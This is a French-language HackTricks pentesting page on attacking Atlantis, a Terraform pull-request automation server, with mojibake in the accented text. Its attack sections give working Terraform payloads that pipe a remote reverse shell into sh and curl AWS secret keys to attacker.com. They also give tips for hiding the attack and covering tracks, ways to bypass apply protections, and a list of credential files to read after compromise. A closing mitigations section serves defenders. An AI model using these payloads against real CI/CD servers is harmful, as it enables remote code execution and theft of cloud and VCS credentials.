# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis aide essentiellement √† ex√©cuter terraform √† partir de Pull Requests de votre serveur git.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. Allez sur la **page des versions d'atlantis** √† [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) et **t√©l√©chargez** celle qui vous convient.
2. Cr√©ez un **jeton personnel** (avec acc√®s au d√©p√¥t) de votre utilisateur **github**
3. Ex√©cutez `./atlantis testdrive` et cela cr√©era un **d√©p√¥t de d√©monstration** que vous pouvez utiliser pour **communiquer avec atlantis**
1. Vous pouvez acc√©der √† la page web √† 127.0.0.1:4141

### Atlantis Access

#### Git Server Credentials

**Atlantis** prend en charge plusieurs h√¥tes git tels que **Github**, **Gitlab**, **Bitbucket** et **Azure DevOps**.\
Cependant, pour acc√©der aux d√©p√¥ts sur ces plateformes et effectuer des actions, il doit avoir un **acc√®s privil√©gi√© accord√©** (au moins des autorisations d'√©criture).\
[**Les docs**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) encouragent √† cr√©er un utilisateur sur ces plateformes sp√©cifiquement pour Atlantis, mais certaines personnes peuvent utiliser des comptes personnels.

{% hint style="warning" %}
Dans tous les cas, du point de vue d'un attaquant, le **compte Atlantis** sera tr√®s **int√©ressant** √† **compromettre**.
{% endhint %}

#### Webhooks

Atlantis utilise optionnellement [**Webhook secrets**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) pour valider que les **webhooks** qu'il re√ßoit de votre h√¥te Git sont **l√©gitimes**.

Une fa√ßon de confirmer cela serait de **permettre uniquement les requ√™tes provenant des IP** de votre h√¥te Git, mais une fa√ßon plus simple est d'utiliser un Webhook Secret.

Notez que, √† moins que vous n'utilisiez un serveur github ou bitbucket priv√©, vous devrez exposer les points de terminaison webhook √† Internet.

{% hint style="warning" %}
Atlantis va **exposer des webhooks** afin que le serveur git puisse lui envoyer des informations. Du point de vue d'un attaquant, il serait int√©ressant de savoir **si vous pouvez lui envoyer des messages**.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[From the docs:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis ex√©cute Terraform en **ex√©cutant simplement les commandes `terraform plan` et `apply`** sur le serveur **o√π Atlantis est h√©berg√©**. Tout comme lorsque vous ex√©cutez Terraform localement, Atlantis a besoin de credentials pour votre fournisseur sp√©cifique.

C'est √† vous de [fournir des credentials](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) pour votre fournisseur sp√©cifique √† Atlantis :

* Le [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) d'Atlantis et le [Module AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) ont leurs propres m√©canismes pour les credentials du fournisseur. Lisez leurs docs.
* Si vous ex√©cutez Atlantis dans le cloud, alors de nombreux clouds ont des moyens de donner un acc√®s API cloud aux applications qui y sont ex√©cut√©es, ex :
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Recherchez "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* De nombreux utilisateurs d√©finissent des variables d'environnement, ex. `AWS_ACCESS_KEY`, l√† o√π Atlantis est ex√©cut√©.
* D'autres cr√©ent les fichiers de configuration n√©cessaires, ex. `~/.aws/credentials`, l√† o√π Atlantis est ex√©cut√©.
* Utilisez le [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) pour obtenir des credentials de fournisseur.

{% hint style="warning" %}
Le **conteneur** o√π **Atlantis** est **ex√©cut√©** contiendra tr√®s probablement des **credentials privil√©gi√©s** pour les fournisseurs (AWS, GCP, Github...) qu'Atlantis g√®re via Terraform.
{% endhint %}

#### Web Page

Par d√©faut, Atlantis ex√©cutera une **page web sur le port 4141 en localhost**. Cette page vous permet simplement d'activer/d√©sactiver l'application atlantis et de v√©rifier l'√©tat du plan des d√©p√¥ts et de les d√©verrouiller (elle ne permet pas de modifier des choses, donc elle n'est pas tr√®s utile).

Vous ne la trouverez probablement pas expos√©e √† Internet, mais il semble que par d√©faut **aucune credential n'est n√©cessaire** pour y acc√©der (et si elles le sont, `atlantis`:`atlantis` sont les **valeurs par d√©faut**).

### Server Configuration

La configuration pour `atlantis server` peut √™tre sp√©cifi√©e via des options de ligne de commande, des variables d'environnement, un fichier de configuration ou un m√©lange des trois.

* Vous pouvez trouver [**ici la liste des options**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) prises en charge par le serveur Atlantis
* Vous pouvez trouver [**ici comment transformer une option de configuration en variable d'environnement**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Les valeurs sont **choisies dans cet ordre** :

1. Options
2. Variables d'environnement
3. Fichier de configuration

{% hint style="warning" %}
Notez que dans la configuration, vous pourriez trouver des valeurs int√©ressantes telles que **tokens et mots de passe**.
{% endhint %}

#### Repos Configuration

Certaines configurations affectent **comment les d√©p√¥ts sont g√©r√©s**. Cependant, il est possible que **chaque d√©p√¥t n√©cessite des param√®tres diff√©rents**, donc il existe des moyens de sp√©cifier chaque d√©p√¥t. Voici l'ordre de priorit√© :

1. Fichier [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Ce fichier peut √™tre utilis√© pour sp√©cifier comment atlantis doit traiter le d√©p√¥t. Cependant, par d√©faut, certaines cl√©s ne peuvent pas √™tre sp√©cifi√©es ici sans certaines options permettant cela.
1. Probablement requis d'√™tre autoris√© par des options comme `allowed_overrides` ou `allow_custom_workflows`
2. [**Configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) : Vous pouvez le passer avec l'option `--repo-config` et c'est un yaml configurant de nouveaux param√®tres pour chaque d√©p√¥t (regex pris en charge)
3. Valeurs **par d√©faut**

**PR Protections**

Atlantis permet d'indiquer si vous souhaitez que le **PR** soit **`approuv√©`** par quelqu'un d'autre (m√™me si cela n'est pas d√©fini dans la protection de branche) et/ou soit **`fusionnable`** (protections de branche pass√©es) **avant d'ex√©cuter apply**. D'un point de vue s√©curit√©, il est recommand√© de d√©finir les deux options.

Dans le cas o√π `allowed_overrides` est True, ces param√®tres peuvent √™tre **√©cras√©s sur chaque projet par le fichier `/atlantis.yml`**.

**Scripts**

La configuration du d√©p√¥t peut **sp√©cifier des scripts** √† ex√©cuter [**avant**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_hooks de pr√©-traitement_) et [**apr√®s**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_hooks de post-traitement_) qu'un **workflow est ex√©cut√©.**

Il n'y a aucune option pour permettre de **sp√©cifier** ces scripts dans le **fichier de d√©p√¥t `/atlantis.yml`**.

**Workflow**

Dans la configuration du d√©p√¥t (configuration c√¥t√© serveur), vous pouvez [**sp√©cifier un nouveau workflow par d√©faut**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**cr√©er de nouveaux workflows personnalis√©s**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Vous pouvez √©galement **sp√©cifier** quels **d√©p√¥ts** peuvent **acc√©der** aux **nouveaux** g√©n√©r√©s.\
Ensuite, vous pouvez permettre au fichier **atlantis.yaml** de chaque d√©p√¥t de **sp√©cifier le workflow √† utiliser.**

{% hint style="danger" %}
Si l'option [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est d√©finie sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **√©craser le workflow** qui va √™tre utilis√©.\
Cela donnera essentiellement **RCE dans le serveur Atlantis √† tout utilisateur qui peut acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**V√©rification des politiques Conftest**

Atlantis prend en charge l'ex√©cution des **politiques** [**conftest**](https://www.conftest.dev/) **c√¥t√© serveur** contre la sortie du plan. Les cas d'utilisation courants pour cette √©tape incluent :

* Interdire l'utilisation d'une liste de modules
* Affirmer les attributs d'une ressource au moment de sa cr√©ation
* Attraper les suppressions de ressources non intentionnelles
* Pr√©venir les risques de s√©curit√© (c'est-√†-dire exposer des ports s√©curis√©s au public)

Vous pouvez v√©rifier comment le configurer dans [**la documentation**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Commandes Atlantis

[**Dans la documentation**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis), vous pouvez trouver les options que vous pouvez utiliser pour ex√©cuter Atlantis :
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Attaques

{% hint style="warning" %}
Si pendant l'exploitation vous trouvez cette **erreur** : `Error: Error acquiring the state lock`

Vous pouvez le corriger en ex√©cutant :
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Modification de configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis plan`** (ou peut-√™tre est-ce ex√©cut√© automatiquement) **vous pourrez RCE √† l'int√©rieur du serveur Atlantis**.

Vous pouvez le faire en faisant [**charger une source de donn√©es externe par Atlantis**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Il suffit de mettre un payload comme le suivant dans le fichier `main.tf` :
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Attaque plus discr√®te**

Vous pouvez effectuer cette attaque m√™me de mani√®re **plus discr√®te**, en suivant ces suggestions :

* Au lieu d'ajouter le rev shell directement dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient le rev shell :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code rev shell dans [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour cacher le **code rev shell terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Au lieu** de cr√©er un **PR vers master** pour d√©clencher Atlantis, **cr√©ez 2 branches** (test1 et test2) et cr√©ez un **PR de l'une √† l'autre**. Lorsque vous avez termin√© l'attaque, il vous suffit de **supprimer le PR et les branches**.

#### Dump des secrets du plan Atlantis

Vous pouvez **dumper les secrets utilis√©s par terraform** en ex√©cutant `atlantis plan` (`terraform plan`) en mettant quelque chose comme ceci dans le fichier terraform :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Modification de configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis apply`, vous pourrez RCE √† l'int√©rieur du serveur Atlantis**.

Cependant, vous devrez g√©n√©ralement contourner certaines protections :

* **Mergeable** : Si cette protection est d√©finie dans Atlantis, vous ne pouvez ex√©cuter **`atlantis apply` que si la PR est fusionnable** (ce qui signifie que la protection de branche doit √™tre contourn√©e).
* V√©rifiez les [**contournements de protections de branche potentiels**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Approuv√©** : Si cette protection est d√©finie dans Atlantis, un **autre utilisateur doit approuver la PR** avant que vous puissiez ex√©cuter `atlantis apply`
* Par d√©faut, vous pouvez abuser du [**token Gitbot pour contourner cette protection**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Ex√©cution de **`terraform apply` sur un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez simplement vous assurer qu'une charge utile comme les suivantes se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te**.

#### Injection de Param√®tres Terraform

Lors de l'ex√©cution de `atlantis plan` ou `atlantis apply`, terraform est ex√©cut√© en arri√®re-plan, vous pouvez passer des commandes √† terraform depuis atlantis en commentant quelque chose comme :
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Quelque chose que vous pouvez passer sont des variables d'environnement qui pourraient √™tre utiles pour contourner certaines protections. V√©rifiez les variables d'environnement terraform dans [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Workflow personnalis√©

Ex√©cution de **commandes de construction personnalis√©es malveillantes** sp√©cifi√©es dans un fichier `atlantis.yaml`. Atlantis utilise le fichier `atlantis.yaml` de la branche de la demande de tirage, **pas** de `master`.\
Cette possibilit√© a √©t√© mentionn√©e dans une section pr√©c√©dente :

{% hint style="danger" %}
Si le drapeau [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est d√©fini sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.

Cela donnera essentiellement **RCE sur le serveur Atlantis √† tout utilisateur pouvant acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Contourner les protections de plan/apply

Si le drapeau [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _a_ `apply_requirements` configur√©, il est possible pour un d√©p√¥t de **modifier les protections de plan/apply pour les contourner**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Si quelqu'un envoie des **commentaires `atlantis plan/apply` sur vos pull requests valides,** cela fera ex√©cuter terraform quand vous ne le souhaitez pas.

De plus, si vous n'avez pas configur√© dans la **protection de branche** pour demander une **r√©√©valuation** de chaque PR lorsqu'un **nouveau commit est pouss√©** dessus, quelqu'un pourrait **√©crire des configurations malveillantes** (voir les sc√©narios pr√©c√©dents) dans la configuration terraform, ex√©cuter `atlantis plan/apply` et obtenir RCE.

C'est le **param√®tre** dans les protections de branche de Github :

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Si vous parvenez √† **voler le secret du webhook** utilis√© ou s'il **n'y a pas de secret de webhook** utilis√©, vous pourriez **appeler le webhook d'Atlantis** et **invoquer des commandes atlatis** directement.

#### Bitbucket

Bitbucket Cloud **ne prend pas en charge les secrets de webhook**. Cela pourrait permettre aux attaquants de **falsifier des requ√™tes depuis Bitbucket**. Assurez-vous de n'autoriser que les IPs de Bitbucket.

* Cela signifie qu'un **attaquant** pourrait faire des **requ√™tes falsifi√©es √† Atlantis** qui semblent provenir de Bitbucket.
* Si vous sp√©cifiez `--repo-allowlist`, alors ils ne pourraient falsifier que des requ√™tes concernant ces d√©p√¥ts, donc le plus de d√©g√¢ts qu'ils pourraient causer serait de planifier/appliquer sur vos propres d√©p√¥ts.
* Pour √©viter cela, autorisez les [adresses IP de Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (voir les adresses IPv4 sortantes).

### Post-Exploitation

Si vous avez r√©ussi √† acc√©der au serveur ou au moins √† obtenir un LFI, il y a des choses int√©ressantes que vous devriez essayer de lire :

* `/home/atlantis/.git-credentials` Contient les identifiants d'acc√®s vcs
* `/atlantis-data/atlantis.db` Contient les identifiants d'acc√®s vcs avec plus d'infos
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Fichier d'√©tat terraform
* Exemple : /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Variables d'environnement
* `/proc/[2-20]/cmdline` Ligne de commande de `atlantis server` (peut contenir des donn√©es sensibles)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Parce que n'importe qui peut commenter sur des pull requests publiques, m√™me avec toutes les mitigations de s√©curit√© disponibles, il est toujours dangereux d'ex√©cuter Atlantis sur des d√©p√¥ts publics sans une configuration appropri√©e des param√®tres de s√©curit√©.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si vous ex√©cutez sur un d√©p√¥t public (ce qui n'est pas recommand√©, voir ci-dessus), vous ne devriez pas d√©finir `--allow-fork-prs` (par d√©faut √† false) car n'importe qui peut ouvrir une pull request depuis son fork vers votre d√©p√¥t.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis n√©cessite que vous sp√©cifiiez une liste blanche de d√©p√¥ts √† partir desquels il acceptera des webhooks via le drapeau `--repo-allowlist`. Par exemple :

* D√©p√¥ts sp√©cifiques : `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Votre organisation enti√®re : `--repo-allowlist=github.com/runatlantis/*`
* Chaque d√©p√¥t dans votre installation GitHub Enterprise : `--repo-allowlist=github.yourcompany.com/*`
* Tous les d√©p√¥ts : `--repo-allowlist=*`. Utile lorsque vous √™tes dans un r√©seau prot√©g√© mais dangereux sans √©galement d√©finir un secret de webhook.

Ce drapeau garantit que votre installation d'Atlantis n'est pas utilis√©e avec des d√©p√¥ts que vous ne contr√¥lez pas. Voir `atlantis server --help` pour plus de d√©tails.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si les attaquants soumettant des pull requests avec du code Terraform malveillant font partie de votre mod√®le de menace, alors vous devez √™tre conscient que les approbations `terraform apply` ne suffisent pas. Il est possible d'ex√©cuter du code malveillant dans un `terraform plan` en utilisant la [source de donn√©es `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou en sp√©cifiant un fournisseur malveillant. Ce code pourrait alors exfiltrer vos identifiants.

Pour √©viter cela, vous pourriez :

1. Int√©grer les fournisseurs dans l'image Atlantis ou h√©berger et refuser l'egress en production.
2. Mettre en ≈ìuvre le protocole de registre de fournisseurs en interne et refuser l'egress public, de cette fa√ßon vous contr√¥lez qui a un acc√®s en √©criture au registre.
3. Modifier votre [configuration de d√©p√¥t c√¥t√© serveur](https://www.runatlantis.io/docs/server-side-repo-config.html)'s √©tape `plan` pour valider l'utilisation de fournisseurs ou de sources de donn√©es non autoris√©s ou de PRs d'utilisateurs non autoris√©s. Vous pourriez √©galement ajouter une validation suppl√©mentaire √† ce stade, par exemple exiger un "pouce en l'air" sur la PR avant de permettre √† la `plan` de continuer. Conftest pourrait √™tre utile ici.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis doit √™tre ex√©cut√© avec des secrets de webhook d√©finis via les variables d'environnement `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. M√™me avec le drapeau `--repo-allowlist` d√©fini, sans un secret de webhook, les attaquants pourraient faire des requ√™tes √† Atlantis en se faisant passer pour un d√©p√¥t qui est sur la liste blanche. Les secrets de webhook garantissent que les requ√™tes webhook proviennent r√©ellement de votre fournisseur VCS (GitHub ou GitLab).

Si vous utilisez Azure DevOps, au lieu des secrets de webhook, ajoutez un nom d'utilisateur et un mot de passe de base.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps prend en charge l'envoi d'un en-t√™te d'authentification de base dans tous les √©v√©nements de webhook. Cela n√©cessite d'utiliser une URL HTTPS pour votre emplacement de webhook.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si vous utilisez des secrets de webhook mais que votre trafic est sur HTTP, alors les secrets de webhook pourraient √™tre vol√©s. Activez SSL/HTTPS en utilisant les drapeaux `--ssl-cert-file` et `--ssl-key-file`.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Il est fortement recommand√© d'activer l'authentification dans le service web. Activez BasicAuth en utilisant `--web-basic-auth=true` et configurez un nom d'utilisateur et un mot de passe en utilisant les drapeaux `--web-username=yourUsername` et `--web-password=yourPassword`.

Vous pouvez √©galement passer ces valeurs en tant que variables d'environnement `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` et `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
